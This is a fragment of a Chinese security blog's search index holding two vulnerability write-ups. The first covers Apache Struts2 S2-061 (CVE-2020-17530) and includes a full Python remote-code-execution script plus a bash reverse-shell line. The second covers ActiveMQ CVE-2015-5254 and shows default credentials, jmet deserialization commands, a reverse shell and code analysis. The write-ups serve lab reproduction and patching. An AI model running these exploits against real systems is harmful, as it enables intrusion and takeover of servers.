+<h4 id="直接执行命令"><a href="#直接执行命令" class="headerlink" title="直接执行命令"></a>直接执行命令</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216201525731.png" alt="image-20201216201525731"></p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>通过在线地址将bash反弹命令进行进行编码转换</p>
+<p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<p>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216210508614.png" alt="image-20201216210508614"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205907765.png" alt="image-20201216205907765"></p>
+<h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url,cmd</span>):</span></span><br><span class="line">    payload=<span class="string">&quot;%25%7b(%27ol4three%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27&quot;</span>+cmd+<span class="string">&quot;%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d&quot;</span></span><br><span class="line">    tturl=url+<span class="string">&quot;/?id=&quot;</span>+payload</span><br><span class="line">    r=requests.get(tturl)</span><br><span class="line">    page=r.text</span><br><span class="line"><span class="comment">#   etree=html.etree</span></span><br><span class="line">    page=etree.HTML(page)</span><br><span class="line">    data = page.xpath(<span class="string">&#x27;//a[@id]/@id&#x27;</span>)</span><br><span class="line">    print(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ EXP: python struts2-061-poc.py http://1.1.1.1:8081 id      +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ VER: Struts 2.0.0-2.5.25                                   +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ S2-061 RCE &amp;&amp; CVE-2020-17530                               +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&quot;[+]ussage: http://ip:port command&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;[+]============================================================&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    url=sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd=sys.argv[<span class="number">2</span>]</span><br><span class="line">exp(url,cmd)</span><br></pre></td></tr></table></figure>
+
+<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216203912346.png" alt="image-20201216203912346"></p>
+<h4 id="Goby-poc-开发界面"><a href="#Goby-poc-开发界面" class="headerlink" title="Goby poc 开发界面"></a>Goby poc 开发界面</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216204623455.png" alt="image-20201216204623455"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205437353.png" alt="image-20201216205437353"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205455850.png" alt="image-20201216205455850"></p>
+<h4 id="单个漏洞验证"><a href="#单个漏洞验证" class="headerlink" title="单个漏洞验证"></a>单个漏洞验证</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205525154.png" alt="image-20201216205525154"></p>
+<h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>将Apache Struts框架升级至最新版本</p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-061">https://cwiki.apache.org/confluence/display/WW/S2-061</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/rcfXIBSpNtgCFua0yUK_ew">https://mp.weixin.qq.com/s/rcfXIBSpNtgCFua0yUK_ew</a></p>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+      <tags>
+        <tag>struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ActiveMQ漏洞复现和分析（CVE-2015-5254）</title>
+    <url>/2020/12/04/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90%EF%BC%88CVE-2015-5254%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub拉取漏洞环境docker启动</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h2><p>使用namp对目标进行扫描</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV IP -p 8161,61616</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host is up (0.00029s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">8161&#x2F;tcp  open  http     Jetty 8.1.16.v20140903</span><br><span class="line">61616&#x2F;tcp open  apachemq ActiveMQ OpenWire transport</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port61616-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;12&#x2F;13%Time&#x3D;5FD5DA4A%P&#x3D;x86_64-apple-darwin19.</span><br><span class="line">SF:0.0%r(NULL,F4,&quot;\0\0\0\xf0\x01ActiveMQ\0\0\0\n\x01\0\0\0\xde\0\0\0\t\0\x</span><br><span class="line">SF:0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\tCacheSize\x05\0\0\x04\0\0\x0cCac</span><br><span class="line">SF:heEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\x20MaxInactivityDurat</span><br><span class="line">SF:ionInitalDelay\x06\0\0\0\0\0\0&#39;\x10\0\x11TcpNoDelayEnabled\x01\x01\0\x1</span><br><span class="line">SF:5MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x14TightEncodingEnabled\x01\</span><br><span class="line">SF:x01\0\x11StackTraceEnabled\x01\x01&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="默认口令漏洞"><a href="#默认口令漏洞" class="headerlink" title="默认口令漏洞"></a>默认口令漏洞</h2><p>ActiveMQ默认口令是admin/admin 登陆后可以看到对应的版本信息。<strong>放序列化需要登陆后才能触发，任意文件上传访问webshell需要登录</strong></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201213171426069.png" alt="image-20201213171426069"></p>
+<h2 id="反序列化漏洞-CVE-2015-5254"><a href="#反序列化漏洞-CVE-2015-5254" class="headerlink" title="反序列化漏洞(CVE-2015-5254)"></a>反序列化漏洞(CVE-2015-5254)</h2><p>漏洞利用过程如下：</p>
+<p>a.构造(可以使用ysoserial)可执行命令的序列化对象</p>
+<p>b.作为一个消息，发送给目标的61616端口</p>
+<p>c.访问Web管理界面，读取消息触发漏洞</p>
+<p>jmet的jar文件（这里windows和linux都经过了测试，windows在 “1.8.0_241”版本中可利用成功，linux在”11.0.7“不可以，应该是java版本导致的原因）</p>
+<p><a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar">下载jmet</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;sucess&quot; -Yp ROME 目标IP 61616</span><br></pre></td></tr></table></figure>
+
+<p>发送成功如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:ol4three-55063-1607996494671-0:1</span><br><span class="line">INFO d.c.j.t.JMSTarget [main] Sent gadget &quot;ROME&quot; with command: &quot;touch &#x2F;tmp&#x2F;sucess&quot;</span><br><span class="line">INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:ol4three-55063-1607996494671-0:1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215095044834.png" alt="image-20201215095044834"></p>
+<p>点击队列即可触发（如果没有弱口令，可写入后等待管理员点击触发），可成功执行建立文件的命令，这里可通过以下命令进入docker查看</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 609d53eb4f5a &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215101659372.png" alt="image-20201215101659372"></p>
+<p>反弹shell需要在<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">这里</a>将bash反弹命令进行编码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;编码后的反弹命令&quot; -Yp ROME 目标IP 61616</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215105651639.png" alt="image-20201215105651639"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞触发流程如下</p>
+<p><strong>ObjectMessage.setObject() -&gt;MessageProducer.send()→MessageConsumer.recive()→ObjectMessage.getObject()</strong></p>
+<p>下面是setObject()和getObject()的操作接口</p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215150520127.png" alt="image-20201215150520127"></p>
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215150819658.png" alt="image-20201215150819658"></p>
+<p>这里为序列化操作</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void writeObject(ObjectOutputStream s) throws IOException &#123;</span><br><span class="line"> int sshift &#x3D; 0;</span><br><span class="line"> int ssize &#x3D; 1;</span><br><span class="line"> while (ssize &lt; 16) &#123;</span><br><span class="line"> sshift++;</span><br><span class="line"> ssize &lt;&lt;&#x3D; 1;</span><br><span class="line"> &#125; </span><br><span class="line"> int segmentShift &#x3D; 32 - sshift;</span><br><span class="line"> int segmentMask &#x3D; ssize - 1;</span><br><span class="line"> Segment[] segments &#x3D; (Segment[])new Segment[16];</span><br><span class="line"> for (int i &#x3D; 0; i &lt; segments.length; i++)</span><br><span class="line"> segments[i] &#x3D; new Segment(0.75F); </span><br><span class="line"> s.putFields().put(&quot;segments&quot;, segments);</span><br><span class="line"> s.putFields().put(&quot;segmentShift&quot;, segmentShift);</span><br><span class="line"> s.putFields().put(&quot;segmentMask&quot;, segmentMask);</span><br><span class="line"> s.writeFields();</span><br><span class="line"> Node[] arrayOfNode;</span><br><span class="line"> if ((arrayOfNode &#x3D; this.table) !&#x3D; null) &#123;</span><br><span class="line"> Traverser&lt;K, V&gt; it &#x3D; new Traverser&lt;K, V&gt;(arrayOfNode, arrayOfNode.length, 0, arrayOfNode.length); Node&lt;K, </span><br><span class="line">V&gt; p;</span><br><span class="line"> while ((p &#x3D; it.advance()) !&#x3D; null) &#123;</span><br><span class="line"> s.writeObject(p.key);</span><br><span class="line"> s.writeObject(p.val);</span><br><span class="line"> &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> s.writeObject(null);</span><br><span class="line"> s.writeObject(null);</span><br><span class="line"> segments &#x3D; null;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215170349015.png" alt="image-20201215170349015"></p>
+<p>getObject()方法会调用readobject()方法中将data中的数据进行反序列化并且触发漏洞</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void readObject(ObjectInputStream stream) throws InvalidObjectException &#123; throw new </span><br><span class="line">InvalidObjectException(&quot;Proxy required&quot;); &#125;</span><br><span class="line"> static final class SerializationProxy&lt;K, V&gt;</span><br><span class="line"> extends Object</span><br><span class="line"> implements Serializable</span><br><span class="line"> &#123;</span><br><span class="line"> final EntryWeigher&lt;? super K, ? super V&gt; weigher;</span><br><span class="line"> final EvictionListener&lt;K, V&gt; listener;</span><br><span class="line"> final int concurrencyLevel;</span><br><span class="line"> final Map&lt;K, V&gt; data;</span><br><span class="line"> final long capacity;</span><br><span class="line"> static final long serialVersionUID &#x3D; 1L;</span><br><span class="line"> SerializationProxy(ConcurrentLinkedHashMap&lt;K, V&gt; map) &#123;</span><br><span class="line"> this.concurrencyLevel &#x3D; map.concurrencyLevel;</span><br><span class="line"> this.data &#x3D; new HashMap(map);</span><br><span class="line"> this.capacity &#x3D; map.capacity.get();</span><br><span class="line"> this.listener &#x3D; map.listener;</span><br><span class="line"> this.weigher &#x3D; map.weigher;</span><br><span class="line"> &#125;</span><br><span class="line"> Object readResolve() &#123;</span><br><span class="line"> ConcurrentLinkedHashMap&lt;K, V&gt; map &#x3D; (new ConcurrentLinkedHashMap.Builder()).concurrencyLevel(this.</span><br><span class="line">concurrencyLevel).maximumWeightedCapacity(this.capacity).listener(this.listener).weigher(this.weigher).build();</span><br><span class="line"> map.putAll(this.data);</span><br><span class="line"> return map;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+      <tags>
+        <tag>ActiveMQ</tag>
       </tags>
   </entry>
 </search>
